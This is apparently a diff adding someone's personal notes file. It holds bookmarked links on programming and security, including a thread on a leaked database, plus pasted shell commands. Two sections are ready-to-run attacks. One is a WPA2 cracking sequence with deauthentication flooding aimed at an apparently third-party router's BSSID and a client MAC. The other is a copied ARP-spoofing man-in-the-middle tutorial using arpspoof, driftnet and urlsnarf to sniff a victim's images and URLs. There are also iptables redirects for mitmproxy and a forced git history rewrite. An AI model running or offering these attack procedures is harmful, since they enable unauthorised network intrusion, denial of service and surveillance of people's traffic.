@@ -1,0 +1,296 @@
+https://compilergym.com/getting_started.html
+https://www.iforce2d.net/b2dtut/setup-linux
+https://www.code-intelligence.com/blog/secure-coding-cpp-using-fuzzing
+
+https://www.wifi-professionals.com/2019/01/4-way-handshake
+https://ffmpeg.substack.com/p/ffmpeg-and-sdl-part-1-of-making-a
+
+
+https://www.fosslinux.com/48115/kali-linux-wordlist-what-you-need-to-know.htm
+
+https://breachforums.is/Thread-Databases-Leak-UPA-University
+
+https://www.deconstructconf.com/2017/evan-czaplicki-on-storytelling
+
+https://newsletter.systemdesign.one/p/postgresql-scalability
+https://dilipkumar.medium.com/standalone-mongodb-on-kubernetes-cluster-19e7b5896b27
+https://devopscube.com/deploy-mongodb-kubernetes/
+https://jaycarlson.net/embedded-linux/
+
+https://learning.edx.org/course/course-v1:LinuxFoundationX+LFS158x+1T2022/home
+
+
+
+https://www.csoonline.com/article/547432/data-protection-coding-flaw-leaves-zeus-admin-panels-easily-exploited.html
+https://en.wikipedia.org/wiki/Zeus_(malware)
+https://www.crowdstrike.com/cybersecurity-101/malware/trojan-zeus-malware/
+
+https://google.github.io/styleguide/cppguide.html#Exceptions
+https://developers.google.com/edu/c++
+
+
+
+
+https://practicalsecurityanalytics.com/how-to-emulate-a-ransomware-attack/
+https://tomstu.art/hello-declarative-world
+https://blog.cloudflare.com/stronger-than-a-promise-proving-oblivious-http-privacy-properties
+https://cs.aviparshan.com/post/2022/09/20/buffer-overflow.html
+https://salt.security/blog/security-flaws-within-chatgpt-extensions-allowed-access-to-accounts-on-third-party-websites-and-sensitive-data?utm_source=social&utm_medium=reddit
+https://usa.kaspersky.com/blog/logofail-uefi-vulnerabilities/29588/
+https://gaultier.github.io/blog/you_inherited_a_legacy_cpp_codebase_now_what.html
+https://labs.guard.io/subdomailing-thousands-of-hijacked-major-brand-subdomains-found-bombarding-users-with-millions-a5e5fb892935
+https://muxup.com/2023q4/storing-data-in-pointers
+https://analyticsindiamag.com/author/rajkumaranalyticsindiamag-com/page/3/
+https://graphite.dev/blog/your-github-pr-workflow-is-slow
+https://stackoverflow.com/questions/45089386/what-is-the-best-way-to-redirect-a-page-using-react-router
+
+https://hamvocke.com/blog/remote-pair-programming-with-tmux/
+https://www.stationx.net/tmux-cheat-sheet/
+https://linuxhandbook.com/ssh-into-container/
+https://www.practical-mongodb-aggregations.com/guides/advanced-arrays.html?highlight=objectToArray
+https://smlx.dev/posts/goodwe-sems-protocol-teardown/
+https://dev.to/davidkpiano/you-don-t-need-a-library-for-state-machines-k7h
+https://jonbellah.com/articles/intro-state-machines
+https://kentcdodds.com/blog/implementing-a-simple-state-machine-library-in-javascript
+
+https://cyberchef.org
+https://swisskyrepo.github.io/PayloadsAllTheThings
+https://regexone.com
+https://www.pinecone.io/learn/vector-database/
+
+https://www.linuxjournal.com/article/6429
+https://redixhumayun.github.io/systems/2024/01/03/atomics-and-concurrency.html
+
+
+https://linuxsecurity.com/features/complete-guide-to-keylogging-in-linux-part-1
+https://drewdevault.com/2018/02/17/Writing-a-Wayland-compositor-1.html
+https://askubuntu.com/questions/678915/whats-the-difference-between-and-in-bash
+https://tldp.org/LDP/abs/html/io-redirection.html
+https://unix.stackexchange.com/questions/159513/what-are-the-shells-control-and-redirection-operators
+
+
+ERROR:
+grep: /etc/sysconfig/network-scripts/ifcfg-*: No such file or directory
+Error: Device does not allow enslaving to a bridge. 
+https://wiki.archlinux.org/title/Network_bridge#With_iproute2
+https://wiki.archlinux.org/title/Software_access_point#Network_configuration
+https://unix.stackexchange.com/questions/554331/theoretical-tap-interface-w-wifi-parent-interface
+https://developers.redhat.com/articles/2022/04/06/introduction-linux-bridging-commands-and-features#
+
+https://security.stackexchange.com/questions/116311/android-devices-are-unable-to-connect-to-rogue-acces-point-created-using-airbase
+https://blog.sevagas.com/?Rogue-WiFi-Access-point
+https://www.server-world.info/en/note?os=Fedora_39&p=dhcp&f=1
+
+iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
+iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080
+ip6tables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
+ip6tables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080
+/////
+sudo iptables -A INPUT -p tcp -m multiport --dports 80,443 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT
+sudo iptables -A OUTPUT -p tcp -m multiport --dports 80,443 -m conntrack --ctstate ESTABLISHED -j ACCEPT
+
+sudo iptables -t nat -S
+sudo iptables -t nat -L
+
+mitmproxy
+
+https://cscope.sourceforge.net/cscope_vim_tutorial.html
+https://courses.cs.washington.edu/courses/cse451/10au/tutorials/tutorial_ctags.html
+https://itsfoss.com/share-files-gnome-boxes/
+https://cert-manager.io/docs/
+https://www.ssh.com/academy/ssh/tunneling-example
+
+https://www.codelivly.com/xss-101
+https://blog.includesecurity.com/2024/02/improving-llm-security-against-prompt-injection-appsec-guidance-for-pentesters-and-developers-part-2/
+https://www.mdpi.com/2076-3417/13/10/5979
+
+https://fearlesssalarynegotiation.com/salary-negotiation-guide/
+https://blog.quasar.ai/why-cpp?utm_content=187346287&utm_medium=social&utm_source=twitter&hss_channel=tw-134381068
+https://www.golinuxcloud.com/tutorial-linux-memory-management-overview/
+
+git reset --hard 59960a3671819e6efbabdf356b282cad97334862
+git push --force
+
+sudo iw dev
+netstat -i
+sudo airmon-ng start wlp0s20f3
+VIDEO===========
+sudo iw dev
+sudo airmon-ng start wlp0s20f3
+sudo iw dev
+sudo airodump-ng wlp0s20f3mon
+# F0:34:04:0A:3F:56  -126        3        0    0   6  130   WPA2 CCMP   PSK  Internet Telcel Y859NC_3F56
+sudo airodump-ng -c 6 -w capture_test -d F0:34:04:0A:3F:56 wlp0s20f3mon
+# get client MAC
+# BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
+# F0:34:04:0A:3F:56  4E:F0:64:CE:E2:A4  -26    1e- 1e     0       87
+sudo aireplay-ng --deauth 0 -a F0:34:04:0A:3F:56 -c 4E:F0:64:CE:E2:A4 wlp0s20f3mon
+./crunch 8 8 -t %%%%%%%% -o wordlist.txt
+sudo aircrack-ng capture_test-01.cap -w wordlist.txt
+sudo airmon-ng stop wlp0s20f3mon
+
+Designa
+https://softwareengineering.stackexchange.com/questions/193415/best-practices-for-sharing-tiny-snippets-of-code-across-projects
+https://www.crowdbotics.com/blog/how-to-maximize-code-reuse-across-projects
+https://www.techtarget.com/searchsoftwarequality/answer/How-do-I-foster-reusable-code-across-dev-projects
+https://www.perforce.com/blog/qac/what-code-reuse-code-reuse-best-practices
+https://www.educative.io/blog/unit-testing-best-practices-overview
+https://www.freecodecamp.org/news/how-to-write-a-good-software-design-document-66fcf019569c/
+https://itnext.io/react-express-node-js-and-mongodb-mern-stack-microservices-based-application-deployment-on-ec4607cec74d
+https://dev.to/alexeagleson/how-to-create-a-node-and-react-monorepo-with-git-submodules-2g83
+https://monorepo.tools/
+https://betterprogramming.pub/the-pros-and-cons-monorepos-explained-f86c998392e1
+https://blog.tara.ai/software-design-documents-template/
+
+
+https://www.kali.org/tools/hydra/
+
+https://www.routerpasswords.com/
+====================================MITM====================================================
+https://ourcodeworld.com/articles/read/422/how-to-perform-a-man-in-the-middle-mitm-attack-with-kali-linux
+https://www.kali.org/tools/driftnet/
+
+Requirements
+
+This article assumes that you know what is a network interface and you know to how to work with Kali Linux and the command line. Before starting, you will need to know the name of the Network interface (installed on your machine) and the IP of the router that provides Wi-Fi access.
+
+Attacker Required information 	Example value (you need to replace these values)
+Network Interface Name 	        wlan0
+Router IP 	                    192.000.000.1
+
+The Network Interface Name can be easily obtained as running the "ifconfig" command on a terminal, then from the list copy the name of the interface that you want to use. The IP of the router can be obtained executing "ip route show" on a terminal and a message like "default via [This is the router IP]".
+
+From the victim, you will only need the IP (the user needs to be connected to the network provided by the router). The process of obtaining the device IP of the victim is totally up to you, there are many ways to know it, for example there are routers/gatefays user interface programs that lists all the connected devices (with IPs on the list) or just use a Network Monitoring Software Tool.
+
+Victim Required Information 	Example value (you need to replace these values)
+Victim device IP 	            192.000.000.52
+
+As we're hacking ourselves in this article, we can obtain easily this information directly from our device:
+
+We are going to perform a MITM attack to a Samsung Galaxy S7 (connected to the router (router ip 192.000.000.1) with IP 192.000.000.52) that uses Google Chrome and will navigate through different websites to show if the attack really works or not. Once you have collected all the required information, let's get started !
+
+
+
+1. Enable packet forwarding in Linux
+
+The first thing you need to do is to forward all the IPv4 network packages. In this way your machine will act as a router. Execute the following command in a new terminal:
+
+sysctl -w net.ipv4.ip_forward=1
+
+Note
+
+If your machine isn't forwarding the packets, the internet connection of the user will freeze and therefore the attack will be useless.
+
+
+
+2. Intercept packages from victim with arpspoof
+
+arpspoof is a command line utility that allows you to intercept packets on a switched LAN. It redirects too packets from a target host (or all hosts) on the LAN intended for another host on the LAN by forging ARP replies. This is an extremely effective way of sniffing traffic on a switch. The structure of the command to start intercepting packets from the victim to the router is the following:
+
+arpspoof -i [Network Interface Name] -t [Victim IP] [Router IP]
+
+So with our values, the command should look like:
+Important
+
+Run your command in a new terminal and let it running (don't close it until you want to stop the attack).
+
+arpspoof -i wlan0 -t 192.000.000.52 192.000.000.1
+
+This process will monitor the packet flow from the Victim to the Router.
+
+
+
+3. Intercept packets from router with arpspoof
+
+Now that you're intercepting packets from the victim to the router (running on a terminal), you need now to intercept the packets from the victim to the router with arpspoof. The structure of the command to start intercepting packets from the router to the victim is the following:
+
+arpspoof -i [Network Interface Name] -t [Router IP] [Victim IP]
+
+So with our values, the command should look like:
+Important
+
+Run your command in a new terminal and let it running (don't close it until you want to stop the attack).
+
+arpspoof -i wlan0 -t 192.000.000.1 192.000.000.52
+
+As you can see, it's the same command of the previous step but we switched the possition of the arguments. Till this point you're already infiltrated to the connection between your victim and the router. Now you just need to learn how to read those packets using driftnet and urlsnarf.
+
+
+
+4. Sniff images from victim navigation
+
+To see the images from websites that our victim visits, you need to use driftnet. Driftnet is a program which listens to network traffic and picks out images from TCP streams it observes. Fun to run on a host which sees lots of web traffic. The strucure of the command to start driftnet and see the images that the user see on the websites is the following:
+
+driftnet -i [Network Interface Name]
+
+Note
+
+If your machine isn't forwarding the packets, the internet connection of the user will freeze and therefore the attack will be useless.
+
+With the information we have, our command should look like:
+
+driftnet -i wlan0
+
+
+
+
+5. Sniff URLs information from victim navigation
+
+To get information about the websites that our victim visits, you can use urlsnarf for it. It is a command line tool that sniffs HTTP requests in Common Log Format. It outputs all requested URLs sniffed from HTTP traffic in CLF (Common Log Format, used by almost all web servers), suitable for offline post-processing with your favorite web log analysis tool (analog, wwwstat, etc.). The structure of the command to sniff the URLs that your victim visits, is the following:
+
+urlsnarf -i [Network interface name]
+
+In this case, with the information we have, the command to execute will look like:
+Note
+
+If your machine isn't forwarding the packets, the internet connection of the user will freeze and therefore the attack will be useless.
+
+urlsnarf -i wlan0
+
+Congratulations, if you have followed all the steps carefully, you should be now sniffing information about the target you've chosen with a MITM attack. Once your victim visits a website, you should be able to read information about his actions on the internet. To stop the attack, press CTRL + C on every terminal where any process that you've opened is running.
+
+
+
+
+
+6. Disable packet forwarding (only when your attack has finished)
+
+Once you are done with your attack (you don't want to sniff anymore), remember to disable the packet forwarding in the system again executing the following command on a terminal:
+
+sysctl -w net.ipv4.ip_forward=0
+
+
+
+
+Summary
+
+If you have already followed the tutorial, you did everything right and it worked as expected, then follow the summary of the process the next time that you want to do this:
+
+# Enable port forwarding
+sysctl -w net.ipv4.ip_forward=1
+
+# Spoof connection between Victim and Router
+# Note: Run this command in a new terminal and let it running
+arpspoof -i [Network Interface Name] -t [Victim IP] [Router IP]
+
+# Same step but inverted (nope, it's not the same ...)
+# Note: Run this command in a new terminal and let it running
+arpspoof -i [Network Interface Name] -t [Router IP] [Victim IP]
+
+# Execute driftnet to sniff images
+# Note: Run this command in a new terminal and let it running
+driftnet -i [Network Interface Name]
+
+# Sniff URL traffic of the victim
+# Note: Run this command in a new terminal and let it running
+urlsnarf -i [Network Interface Name]
+
+# Disable port forwarding once you're done with the attack
+sysctl -w net.ipv4.ip_forward=0
+
+# Examples for values
+# [Network Interface Name] = wlan0
+# [Victim IP] = 192.000.xx
+# [Router IP] = 192.000.1
+
+Happy hacking !
